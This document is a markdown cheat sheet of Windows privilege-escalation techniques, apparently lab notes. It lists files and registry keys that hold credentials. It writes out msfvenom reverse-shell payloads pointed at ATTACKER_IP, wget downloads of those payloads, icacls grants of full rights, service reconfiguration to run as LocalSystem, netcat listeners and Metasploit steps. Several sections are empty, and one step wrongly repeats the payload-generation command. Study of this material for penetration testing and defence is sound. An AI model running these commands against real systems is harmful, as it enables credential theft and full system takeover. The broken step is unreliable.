# Windows Privilege Escalation

Windows Users :  
- Administrators
- Standard Users

Built-in account : 
- SYSTEM / LocalSystem : full access (even more than administrators)
- Local Service : Default account with the least privileges but uses anonymous connections
- Network Service : Default account with the least privileges but it will use the computer credentials to authenticate through the network

## Harvesting Credentials

#### In Files :
- C:\Unattend.xml
- C:\Windows\Panther\Unattend.xml
- C:\Windows\Panther\Unattend\Unattend.xml
- C:\Windows\system32\sysprep.inf
- C:\Windows\system32\sysprep\sysprep.xml

#### In Powershell History :
Powershell history can be retrieved using a command :  
In Powershell :
```Powershell
type $Env:userprofile\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
```
In cmd:
```cmd
type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
```
#### Saved Windows Credentials
```cmd
cmdkey /list
```
Run a command as an other user using saved credentials
```cmd
runas /savecred /user:admin cmd.exe
```

#### Internet Information Services (IIS) Configuration 
The default web server on Windows installations  

- C:\inetpub\wwwroot\web.config
- C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config

```cmd
type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString
```

#### Retrieve Credentials from Software: PuTTY
PuTTY is an SSH client commonly found on Windows systems  
While PuTTY won't allow users to store their SSH password, it will store proxy configurations that include cleartext authentication credentials.  

```cmd
reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s
```

#### Retrieve credentials from other softwares

## Other Quick Wins

#### Scheduled Tasks
Looking into scheduled tasks on the target system, you may see a scheduled task that either lost its binary or it's using a binary you can modify
```cmd
schtasks /query /tn vulntask /fo list /v
```
`/tn taskname` specify a taskname, the taskname is different from the executed filename
`/fo list` display the output as list  
`/v` verbose  


To check file permissions
```cmd
icacls file.txt
```
If possible, you can pop a reverse shell
- (M) means Modify
- (?) means Readable
- (?) means Executable
- (F) means Full Access
- (AD) means Add Directory
- (WD) means Write Directory

If permissions are set, user can trigger the task
```cmd
schtasks /run /tn TASKNAME
```
#### Always Install Elevated
Windows intaller Files (.msi files) are used to install applications on the system.  
They usually run with the privilege level of the user that starts it.  
However, these can be configured to run with higher privileges from any user account.  
This could potentially allow us to generate a malicious MSI file that would run with admin privileges.

This method requires two registry values to be set. You can query these from the command line using the commands below.
```cmd
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
```

A .msi file can be created using msfvenom
```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKING_10.10.76.45 LPORT=LOCAL_PORT -f msi -o malicious.msi
```
You have to transfer the file  
Make sure that a Metasploit Handler is set and runs correctly

You can start the reverse shell : 
```cmd
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKING_10.10.76.45 LPORT=LOCAL_PORT -f msi -o malicious.msi
```


## Abusing Service Misconfiguration
Windows services are run by SCM (Service Control Manager)   
Each service is associated with an executable (it implements some specific stuff to be launched by the SCM (not all executable can be run as services))  
Each service specify the user account it is run as  
Services have a Discretionary Access Control List (DACL), which indicates who has permission to edit it

Service configurations are stored here : `HKLM\SYSTEM\CurrentControlSet\Services\`


#### Insecure Permissions on Service Executable

We can use `sc` to ask the SCM infos and `qc` specify a service to ask for  
The goal is to retrieve the executable path and the user it runs as for example
```cmd
sc qc SERVICE_NAME
```

Example : We found a service that runs a .exe with modification right, let's exploit it
```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4445 -f exe-service -o rev-svc.exe
python3 -m http.server
```

```powershell
wget http://ATTACKER_IP:8000/rev-svc.exe -O rev-svc.exe
```
```cmd
icacls WService.exe /grant Everyone:F

sc start SERVICE_NAME
sc stop ...
```
or in powershell (sc is aliased to Set-Content)
```powershell
sc.exe start SERVICE_NAME
sc.exe stop ...
```
```bash
nc -lvnp LOCAL_PORT 
```


#### Unquoted Service Paths

If the executable run by the service isn't quoted properly and contains spaces.  
The file is ambiguous. 

Example : the path is C:\MyPrograms\Disk Sorter Enterprise\bin\disksrs.exe
The SCM doesn't know wich version to execute

|Command	| Argument 1 |	Argument 2
|:----------|:-----------|:-------------
C:\MyPrograms\Disk.exe | Sorter | Enterprise\bin\disksrs.exe
C:\MyPrograms\Disk Sorter.exe | Enterprise\bin\disksrs.exe | 
C:\MyPrograms\Disk Sorter Enterprise\bin\disksrs.exe

The SCM will search for option 1 to option 3 in order  
This means that we can create an executable 

Follow Insecure Permissions steps

#### Insecure Service Permissions
If the DACL allows you to modify the configuration of a service, you will be able to reconfigure the service.  
This will allow you to point to any executable you need and run it with any account you prefer, including SYSTEM !

You can use https://learn.microsoft.com/en-us/sysinternals/downloads/accesschk to check for the DACL Service

```cmd
accesschk64.exe -qlc SERVICE_NAME
```
This response means permissions are no well set :
```
[4] ACCESS_ALLOWED_ACE_TYPE: BUILTIN\Users
        SERVICE_ALL_ACCESS
```
Let's exploit it

```powershell
# import the .exe reverse shell to execute
wget http://....:.../FILE.exe -O rev.exe
```
```cmd
# Change rights (like chmod 777 under Unix)
icacls C:\Users\PATH_TO_REVERSE_SHELL\rev.exe /grant Everyone:F
# Change the service configuration 
sc config SERVICE_NAME binPath= "C:\PATH_TO_REVERSE_SHELL\rev.exe" obj= LocalSystem
```

## Abusing Dangerous Privileges

## Abusing Vulnerable Software

## Metasploit
```msfconsole
run post/multi/recon/local_exploit_suggester
```

```msfconsole
run path/to/exploit 
```
Notice that it isn't because the exploit doesn't escalate us to nt authority/ System that it hasn't wordked.  
Checks permissions with `getprivs`, some may have appeared

## Meterpreter auto
```msfconsole
getsystem
```
Notice that sometimes, it will require some manual meterpreter privesc before to be able to escalate us to nt auhtority/system


## Tools